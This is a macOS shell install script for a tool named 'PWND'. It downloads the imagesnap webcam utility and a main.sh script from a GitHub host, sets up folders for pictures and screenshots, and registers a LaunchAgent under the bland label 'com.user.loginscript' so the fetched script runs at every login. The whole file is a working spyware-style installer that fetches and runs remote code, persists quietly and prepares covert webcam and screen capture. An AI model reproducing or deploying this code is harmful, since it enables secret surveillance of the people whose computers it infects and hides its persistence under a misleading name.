#!/bin/sh
HOST="https://github.com/0xpwnd/pwnd"
USER=$(whoami)

echo "++++++++++++++++++++++++++
                         
 _____ _ _ _ _____ ____  
|  _  | | | |   | |    \ 
|   __| | | | | | |  |  |
|__|  |_____|_|___|____/ 
                         
+++++++++++++++++++++++++
=> Starting setup...
"

echo "=> Creating data directory..."
mkdir -p ~/.pwnd
mkdir -p ~/.pwnd/pictures
mkdir -p ~/.pwnd/screenshots
echo $HOST > ~/.pwnd/host
echo "// Done"

echo "=> Downloading imagesnap..."
curl -L -s -o ~/.pwnd/imagesnap.tgz "${HOST}/imagesnap.tgz" > /dev/null

mkdir -p ~/.pwnd/imagesnap
tar xfz ~/.pwnd/imagesnap.tgz -C ~/.pwnd/imagesnap --strip-components 1
echo "// Done"

mkdir -p ~/.pwnd/pictures

echo "=> Downloading main PWND script..."
curl -L -s -o ~/.pwnd/main.sh "${HOST}/main.sh" > /dev/null

chmod +x ~/.pwnd/main.sh
echo "// Done"

echo "=> Creating LaunchAgent..."

cat > ~/.pwnd/agent <<-EOM
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
   <key>Label</key>
   <string>com.user.loginscript</string>
   <key>Program</key>
   <string>/Users/${USER}/.pwnd/main.sh</string>
   <key>RunAtLoad</key>
   <true/>
</dict>
</plist>
EOM

cp ~/.pwnd/agent ~/Library/LaunchAgents/com.user.loginscript.plist
launchctl unload ~/Library/LaunchAgents/com.user.loginscript.plist # just to make sure
launchctl load ~/Library/LaunchAgents/com.user.loginscript.plist

echo "// Done"
